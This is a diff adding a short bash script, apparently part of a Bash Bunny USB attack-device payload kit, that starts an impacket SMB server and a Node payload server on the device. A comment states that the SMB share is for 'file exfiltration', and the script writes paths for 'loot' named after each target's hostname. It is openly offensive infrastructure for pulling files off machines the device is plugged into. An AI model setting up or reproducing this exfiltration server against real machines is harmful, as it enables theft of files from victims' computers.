@@ -1,0 +1,18 @@
+#!/bin/bash
+# Addition exports to hand to payserver for config pull for helper variables for payloads.
+
+export BB_SMBROOT="\\\\$SERVERIP\\$ROOTFOLDERNAME"
+export BB_SMBLOOT="\\\\$SERVERIP\\$ROOTFOLDERNAME\\$TARGET_HOSTNAME"
+
+
+## SMBServer for any file exfiltration, point them to \\bashbunnyip\bbtps.
+$(python /tools/impacket/examples/smbserver.py -comment "bbserver" "$ROOTFOLDERNAME" $ROOTLOOTDIR/ >> $LOOTDIR/smblogs.txt) &
+/usr/bin/nodejs $PAYLOADFOLDER/payserver.js
+export HADERROR=$?
+if [ ! $HADERROR -eq 0 ]; then
+    LED FAIL
+fi
+
+# Kill smb server when done.
+kill $( ps -a | grep python | awk '{print $1}' )
+exit
